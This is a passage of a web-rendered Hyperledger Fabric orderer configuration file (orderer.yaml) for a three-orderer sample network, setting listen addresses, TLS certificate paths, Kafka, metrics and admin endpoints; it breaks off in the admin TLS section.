class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-comment"># Copyright IBM Corp. All Rights Reserved.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># SPDX-License-Identifier: Apache-2.0</span><br><span class="hljs-comment">#</span><br><br>---<br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Orderer Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This controls the type and configuration of the orderer.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>General:<br>    <span class="hljs-comment"># Listen address: The IP on which to bind to listen.</span><br>    ListenAddress: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.66</span><br><br>    <span class="hljs-comment"># Listen port: The port on which to bind to listen.</span><br>    ListenPort: <span class="hljs-number">7050</span><br><br>    <span class="hljs-comment"># TLS: TLS settings for the GRPC server.</span><br>    TLS:<br>        <span class="hljs-comment"># Require server-side TLS</span><br>        Enabled: <span class="hljs-literal">true</span><br>        <span class="hljs-comment"># PrivateKey governs the file location of the private key of the TLS certificate.</span><br>        PrivateKey: <span class="hljs-regexp">/usr/project/fabric/3orderer-org1-2peer-org2-2peer-network/</span>/crypto-config/ordererOrganizations/example.com/orderers/orderer0.example.com/tls/server.key<br>        <span class="hljs-comment"># Certificate governs the file location of the server TLS certificate.</span><br>        Certificate: /usr/project/fabric/<span class="hljs-number">3</span>orderer-org1<span class="hljs-number">-2</span>peer-org2<span class="hljs-number">-2</span>peer-network/crypto-config/ordererOrganizations/example.com/orderers/orderer0.example.com/tls/server.crt<br>        <span class="hljs-comment"># RootCAs contains a list of additional root certificates used for verifying certificates</span><br>        <span class="hljs-comment"># of other orderer nodes during outbound connections.</span><br>        <span class="hljs-comment"># It is not required to be set, but can be used to augment the set of TLS CA certificates</span><br>        <span class="hljs-comment"># available from the MSPs of each channel’s configuration.</span><br>        RootCAs:<br>          - /usr/project/fabric/<span class="hljs-number">3</span>orderer-org1<span class="hljs-number">-2</span>peer-org2<span class="hljs-number">-2</span>peer-network/crypto-config/ordererOrganizations/example.com/orderers/orderer0.example.com/tls/ca.crt<br>        <span class="hljs-comment"># Require client certificates / mutual TLS for inbound connections.</span><br>        ClientAuthRequired: <span class="hljs-literal">false</span><br>        <span class="hljs-comment"># If mutual TLS is enabled, ClientRootCAs contains a list of additional root certificates</span><br>        <span class="hljs-comment"># used for verifying certificates of client connections.</span><br>        <span class="hljs-comment"># It is not required to be set, but can be used to augment the set of TLS CA certificates</span><br>        <span class="hljs-comment"># available from the MSPs of each channel’s configuration.</span><br>        ClientRootCAs:<br>    <span class="hljs-comment"># Keepalive settings for the GRPC server.</span><br>    Keepalive:<br>        <span class="hljs-comment"># ServerMinInterval is the minimum permitted time between client pings.</span><br>        <span class="hljs-comment"># If clients send pings more frequently, the server will</span><br>        <span class="hljs-comment"># disconnect them.</span><br>        ServerMinInterval: <span class="hljs-number">60</span>s<br>        <span class="hljs-comment"># ServerInterval is the time between pings to clients.</span><br>        ServerInterval: <span class="hljs-number">7200</span>s<br>        <span class="hljs-comment"># ServerTimeout is the duration the server waits for a response from</span><br>        <span class="hljs-comment"># a client before closing the connection.</span><br>        ServerTimeout: <span class="hljs-number">20</span>s<br><br>    <span class="hljs-comment"># Since all nodes should be consistent it is recommended to keep</span><br>    <span class="hljs-comment"># the default value of 100MB for MaxRecvMsgSize &amp; MaxSendMsgSize</span><br>    <span class="hljs-comment"># Max message size in bytes the GRPC server and client can receive</span><br>    MaxRecvMsgSize: <span class="hljs-number">104857600</span><br>    <span class="hljs-comment"># Max message size in bytes the GRPC server and client can send</span><br>    MaxSendMsgSize: <span class="hljs-number">104857600</span><br><br>    <span class="hljs-comment"># Cluster settings for ordering service nodes that communicate with other ordering service nodes</span><br>    <span class="hljs-comment"># such as Raft based ordering service.</span><br>    Cluster:<br>        <span class="hljs-comment"># SendBufferSize is the maximum number of messages in the egress buffer.</span><br>        <span class="hljs-comment"># Consensus messages are dropped if the buffer is full, and transaction</span><br>        <span class="hljs-comment"># messages are waiting for space to be freed.</span><br>        SendBufferSize: <span class="hljs-number">10</span><br><br>        <span class="hljs-comment"># ClientCertificate governs the file location of the client TLS certificate</span><br>        <span class="hljs-comment"># used to establish mutual TLS connections with other ordering service nodes.</span><br>        <span class="hljs-comment"># If not set, the server General.TLS.Certificate is re-used.</span><br>        ClientCertificate: /usr/project/fabric/<span class="hljs-number">3</span>orderer-org1<span class="hljs-number">-2</span>peer-org2<span class="hljs-number">-2</span>peer-network/crypto-config/ordererOrganizations/example.com/orderers/orderer0.example.com/tls/server.crt<br>        <span class="hljs-comment"># ClientPrivateKey governs the file location of the private key of the client TLS certificate.</span><br>        <span class="hljs-comment"># If not set, the server General.TLS.PrivateKey is re-used.</span><br>        ClientPrivateKey: /usr/project/fabric/<span class="hljs-number">3</span>orderer-org1<span class="hljs-number">-2</span>peer-org2<span class="hljs-number">-2</span>peer-network/crypto-config/ordererOrganizations/example.com/orderers/orderer0.example.com/tls/server.key<br><br>        <span class="hljs-comment"># The below 4 properties should be either set together, or be unset together.</span><br>        <span class="hljs-comment"># If they are set, then the orderer node uses a separate listener for intra-cluster</span><br>        <span class="hljs-comment"># communication. If they are unset, then the general orderer listener is used.</span><br>        <span class="hljs-comment"># This is useful if you want to use a different TLS server certificates on the</span><br>        <span class="hljs-comment"># client-facing and the intra-cluster listeners.</span><br><br>        <span class="hljs-comment"># ListenPort defines the port on which the cluster listens to connections.</span><br>        ListenPort:<br>        <span class="hljs-comment"># ListenAddress defines the IP on which to listen to intra-cluster communication.</span><br>        ListenAddress:<br>        <span class="hljs-comment"># ServerCertificate defines the file location of the server TLS certificate used for intra-cluster</span><br>        <span class="hljs-comment"># communication.</span><br>        ServerCertificate:<br>        <span class="hljs-comment"># ServerPrivateKey defines the file location of the private key of the TLS certificate.</span><br>        ServerPrivateKey:<br><br>    <span class="hljs-comment"># Bootstrap method: The method by which to obtain the bootstrap block</span><br>    <span class="hljs-comment"># system channel is specified. The option can be one of:</span><br>    <span class="hljs-comment">#   &quot;file&quot; - path to a file containing the genesis block or config block of system channel</span><br>    <span class="hljs-comment">#   &quot;none&quot; - allows an orderer to start without a system channel configuration</span><br>    BootstrapMethod: file<br><br>    <span class="hljs-comment"># Bootstrap file: The file containing the bootstrap block to use when</span><br>    <span class="hljs-comment"># initializing the orderer system channel and BootstrapMethod is set to</span><br>    <span class="hljs-comment"># &quot;file&quot;.  The bootstrap file can be the genesis block, and it can also be</span><br>    <span class="hljs-comment"># a config block for late bootstrap of some consensus methods like Raft.</span><br>    <span class="hljs-comment"># Generate a genesis block by updating $FABRIC_CFG_PATH/configtx.yaml and</span><br>    <span class="hljs-comment"># using configtxgen command with &quot;-outputBlock&quot; option.</span><br>    <span class="hljs-comment"># Defaults to file &quot;genesisblock&quot; (in $FABRIC_CFG_PATH directory) if not specified.</span><br>    BootstrapFile: /usr/project/fabric/<span class="hljs-number">3</span>orderer-org1<span class="hljs-number">-2</span>peer-org2<span class="hljs-number">-2</span>peer-network/channel-artifacts/orderer.genesis.block<br><br>    <span class="hljs-comment"># LocalMSPDir is where to find the private crypto material needed by the</span><br>    <span class="hljs-comment"># orderer. It is set relative here as a default for dev environments but</span><br>    <span class="hljs-comment"># should be changed to the real location in production.</span><br>    LocalMSPDir: /usr/project/fabric/<span class="hljs-number">3</span>orderer-org1<span class="hljs-number">-2</span>peer-org2<span class="hljs-number">-2</span>peer-network/crypto-config/ordererOrganizations/example.com/orderers/orderer0.example.com/msp<br><br>    <span class="hljs-comment"># LocalMSPID is the identity to register the local MSP material with the MSP</span><br>    <span class="hljs-comment"># manager. IMPORTANT: The local MSP ID of an orderer needs to match the MSP</span><br>    <span class="hljs-comment"># ID of one of the organizations defined in the orderer system channel&#x27;s</span><br>    <span class="hljs-comment"># /Channel/Orderer configuration. The sample organization defined in the</span><br>    <span class="hljs-comment"># sample configuration provided has an MSP ID of &quot;SampleOrg&quot;.</span><br>    LocalMSPID: OrdererMSP<br><br>    <span class="hljs-comment"># Enable an HTTP service for Go &quot;pprof&quot; profiling as documented at:</span><br>    <span class="hljs-comment"># https://golang.org/pkg/net/http/pprof</span><br>    Profile:<br>        Enabled: <span class="hljs-literal">false</span><br>        Address: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">6060</span><br><br>    <span class="hljs-comment"># BCCSP configures the blockchain crypto service providers.</span><br>    BCCSP:<br>        <span class="hljs-comment"># Default specifies the preferred blockchain crypto service provider</span><br>        <span class="hljs-comment"># to use. If the preferred provider is not available, the software</span><br>        <span class="hljs-comment"># based provider (&quot;SW&quot;) will be used.</span><br>        <span class="hljs-comment"># Valid providers are:</span><br>        <span class="hljs-comment">#  - SW: a software based crypto provider</span><br>        <span class="hljs-comment">#  - PKCS11: a CA hardware security module crypto provider.</span><br>        Default: SW<br><br>        <span class="hljs-comment"># SW configures the software based blockchain crypto provider.</span><br>        SW:<br>            <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> The default Hash and Security level needs refactoring to be</span><br>            <span class="hljs-comment"># fully configurable. Changing these defaults requires coordination</span><br>            <span class="hljs-comment"># SHA2 is hardcoded in several places, not only BCCSP</span><br>            Hash: SHA2<br>            Security: <span class="hljs-number">256</span><br>            <span class="hljs-comment"># Location of key store. If this is unset, a location will be</span><br>            <span class="hljs-comment"># chosen using: &#x27;LocalMSPDir&#x27;/keystore</span><br>            FileKeyStore:<br>                KeyStore:<br><br>        <span class="hljs-comment"># Settings for the PKCS#11 crypto provider (i.e. when DEFAULT: PKCS11)</span><br>        PKCS11:<br>            <span class="hljs-comment"># Location of the PKCS11 module library</span><br>            Library:<br>            <span class="hljs-comment"># Token Label</span><br>            Label:<br>            <span class="hljs-comment"># User PIN</span><br>            Pin:<br>            Hash:<br>            Security:<br>            FileKeyStore:<br>                KeyStore:<br><br>    <span class="hljs-comment"># Authentication contains configuration parameters related to authenticating</span><br>    <span class="hljs-comment"># client messages</span><br>    Authentication:<br>        <span class="hljs-comment"># the acceptable difference between the current server time and the</span><br>        <span class="hljs-comment"># client&#x27;s time as specified in a client request message</span><br>        TimeWindow: <span class="hljs-number">15</span>m<br><br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   SECTION: File Ledger</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This section applies to the configuration of the file ledger.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>FileLedger:<br><br>    <span class="hljs-comment"># Location: The directory to store the blocks in.</span><br>    Location: /var/hyperledger/production/orderer0<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   SECTION: Kafka</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This section applies to the configuration of the Kafka-based orderer, and</span><br><span class="hljs-comment">#     its interaction with the Kafka cluster.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>Kafka:<br><br>    <span class="hljs-comment"># Retry: What do if a connection to the Kafka cluster cannot be established,</span><br>    <span class="hljs-comment"># or if a metadata request to the Kafka cluster needs to be repeated.</span><br>    Retry:<br>        <span class="hljs-comment"># When a new channel is created, or when an existing channel is reloaded</span><br>        <span class="hljs-comment"># (in case of a just-restarted orderer), the orderer interacts with the</span><br>        <span class="hljs-comment"># Kafka cluster in the following ways:</span><br>        <span class="hljs-comment"># 1. It creates a Kafka producer (writer) for the Kafka partition that</span><br>        <span class="hljs-comment"># corresponds to the channel.</span><br>        <span class="hljs-comment"># 2. It uses that producer to post a no-op CONNECT message to that</span><br>        <span class="hljs-comment"># partition</span><br>        <span class="hljs-comment"># 3. It creates a Kafka consumer (reader) for that partition.</span><br>        <span class="hljs-comment"># If any of these steps fail, they will be re-attempted every</span><br>        <span class="hljs-comment"># &lt;ShortInterval&gt; for a total of &lt;ShortTotal&gt;, and then every</span><br>        <span class="hljs-comment"># &lt;LongInterval&gt; for a total of &lt;LongTotal&gt; until they succeed.</span><br>        <span class="hljs-comment"># Note that the orderer will be unable to write to or read from a</span><br>        <span class="hljs-comment"># channel until all of the steps above have been completed successfully.</span><br>        ShortInterval: <span class="hljs-number">5</span>s<br>        ShortTotal: <span class="hljs-number">10</span>m<br>        LongInterval: <span class="hljs-number">5</span>m<br>        LongTotal: <span class="hljs-number">12</span>h<br>        <span class="hljs-comment"># Affects the socket timeouts when waiting for an initial connection, a</span><br>        <span class="hljs-comment"># response, or a transmission. See Config.Net for more info:</span><br>        <span class="hljs-comment"># https://godoc.org/github.com/Shopify/sarama#Config</span><br>        NetworkTimeouts:<br>            DialTimeout: <span class="hljs-number">10</span>s<br>            ReadTimeout: <span class="hljs-number">10</span>s<br>            WriteTimeout: <span class="hljs-number">10</span>s<br>        <span class="hljs-comment"># Affects the metadata requests when the Kafka cluster is in the middle</span><br>        <span class="hljs-comment"># of a leader election.See Config.Metadata for more info:</span><br>        <span class="hljs-comment"># https://godoc.org/github.com/Shopify/sarama#Config</span><br>        Metadata:<br>            RetryBackoff: <span class="hljs-number">250</span>ms<br>            RetryMax: <span class="hljs-number">3</span><br>        <span class="hljs-comment"># What to do if posting a message to the Kafka cluster fails. See</span><br>        <span class="hljs-comment"># Config.Producer for more info:</span><br>        <span class="hljs-comment"># https://godoc.org/github.com/Shopify/sarama#Config</span><br>        Producer:<br>            RetryBackoff: <span class="hljs-number">100</span>ms<br>            RetryMax: <span class="hljs-number">3</span><br>        <span class="hljs-comment"># What to do if reading from the Kafka cluster fails. See</span><br>        <span class="hljs-comment"># Config.Consumer for more info:</span><br>        <span class="hljs-comment"># https://godoc.org/github.com/Shopify/sarama#Config</span><br>        Consumer:<br>            RetryBackoff: <span class="hljs-number">2</span>s<br>    <span class="hljs-comment"># Settings to use when creating Kafka topics.  Only applies when</span><br>    <span class="hljs-comment"># Kafka.Version is v0.10.1.0 or higher</span><br>    Topic:<br>        <span class="hljs-comment"># The number of Kafka brokers across which to replicate the topic</span><br>        ReplicationFactor: <span class="hljs-number">3</span><br>    <span class="hljs-comment"># Verbose: Enable logging for interactions with the Kafka cluster.</span><br>    Verbose: <span class="hljs-literal">false</span><br><br>    <span class="hljs-comment"># TLS: TLS settings for the orderer&#x27;s connection to the Kafka cluster.</span><br>    TLS:<br><br>      <span class="hljs-comment"># Enabled: Use TLS when connecting to the Kafka cluster.</span><br>      Enabled: <span class="hljs-literal">false</span><br><br>      <span class="hljs-comment"># PrivateKey: PEM-encoded private key the orderer will use for</span><br>      <span class="hljs-comment"># authentication.</span><br>      PrivateKey:<br>        <span class="hljs-comment"># As an alternative to specifying the PrivateKey here, uncomment the</span><br>        <span class="hljs-comment"># following &quot;File&quot; key and specify the file name from which to load the</span><br>        <span class="hljs-comment"># value of PrivateKey.</span><br>        <span class="hljs-comment">#File: path/to/PrivateKey</span><br><br>      <span class="hljs-comment"># Certificate: PEM-encoded signed public key certificate the orderer will</span><br>      <span class="hljs-comment"># use for authentication.</span><br>      Certificate:<br>        <span class="hljs-comment"># As an alternative to specifying the Certificate here, uncomment the</span><br>        <span class="hljs-comment"># following &quot;File&quot; key and specify the file name from which to load the</span><br>        <span class="hljs-comment"># value of Certificate.</span><br>        <span class="hljs-comment">#File: path/to/Certificate</span><br><br>      <span class="hljs-comment"># RootCAs: PEM-encoded trusted root certificates used to validate</span><br>      <span class="hljs-comment"># certificates from the Kafka cluster.</span><br>      RootCAs:<br>        <span class="hljs-comment"># As an alternative to specifying the RootCAs here, uncomment the</span><br>        <span class="hljs-comment"># following &quot;File&quot; key and specify the file name from which to load the</span><br>        <span class="hljs-comment"># value of RootCAs.</span><br>        <span class="hljs-comment">#File: path/to/RootCAs</span><br><br>    <span class="hljs-comment"># SASLPlain: Settings for using SASL/PLAIN authentication with Kafka brokers</span><br>    SASLPlain:<br>      <span class="hljs-comment"># Enabled: Use SASL/PLAIN to authenticate with Kafka brokers</span><br>      Enabled: <span class="hljs-literal">false</span><br>      <span class="hljs-comment"># User: Required when Enabled is set to true</span><br>      User:<br>      <span class="hljs-comment"># Password: Required when Enabled is set to true</span><br>      Password:<br><br>    <span class="hljs-comment"># Kafka protocol version used to communicate with the Kafka cluster brokers</span><br>    <span class="hljs-comment"># (defaults to 0.10.2.0 if not specified)</span><br>    Version:<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Debug Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This controls the debugging options for the orderer</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>Debug:<br><br>    <span class="hljs-comment"># BroadcastTraceDir when set will cause each request to the Broadcast service</span><br>    <span class="hljs-comment"># for this orderer to be written to a file in this directory</span><br>    BroadcastTraceDir:<br><br>    <span class="hljs-comment"># DeliverTraceDir when set will cause each request to the Deliver service</span><br>    <span class="hljs-comment"># for this orderer to be written to a file in this directory</span><br>    DeliverTraceDir:<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Operations Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This configures the operations server endpoint for the orderer</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>Operations:<br>    <span class="hljs-comment"># host and port for the operations server</span><br>    ListenAddress: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8443</span><br><br>    <span class="hljs-comment"># TLS configuration for the operations endpoint</span><br>    TLS:<br>        <span class="hljs-comment"># TLS enabled</span><br>        Enabled: <span class="hljs-literal">false</span><br><br>        <span class="hljs-comment"># Certificate is the location of the PEM encoded TLS certificate</span><br>        Certificate:<br><br>        <span class="hljs-comment"># PrivateKey points to the location of the PEM-encoded key</span><br>        PrivateKey:<br><br>        <span class="hljs-comment"># Most operations service endpoints require client authentication when TLS</span><br>        <span class="hljs-comment"># is enabled. ClientAuthRequired requires client certificate authentication</span><br>        <span class="hljs-comment"># at the TLS layer to access all resources.</span><br>        ClientAuthRequired: <span class="hljs-literal">false</span><br><br>        <span class="hljs-comment"># Paths to PEM encoded ca certificates to trust for client authentication</span><br>        ClientRootCAs: []<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Metrics Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This configures metrics collection for the orderer</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>Metrics:<br>    <span class="hljs-comment"># The metrics provider is one of statsd, prometheus, or disabled</span><br>    Provider: disabled<br><br>    <span class="hljs-comment"># The statsd configuration</span><br>    Statsd:<br>      <span class="hljs-comment"># network type: tcp or udp</span><br>      Network: udp<br><br>      <span class="hljs-comment"># the statsd server address</span><br>      Address: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8125</span><br><br>      <span class="hljs-comment"># The interval at which locally cached counters and gauges are pushed</span><br>      <span class="hljs-comment"># to statsd; timings are pushed immediately</span><br>      WriteInterval: <span class="hljs-number">30</span>s<br><br>      <span class="hljs-comment"># The prefix is prepended to all emitted statsd metrics</span><br>      Prefix:<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Admin Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This configures the admin server endpoint for the orderer</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>Admin:<br>    <span class="hljs-comment"># host and port for the admin server</span><br>    ListenAddress: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9443</span><br><br>    <span class="hljs-comment"># TLS configuration for the admin endpoint</span><br>    TLS:<br>        <span 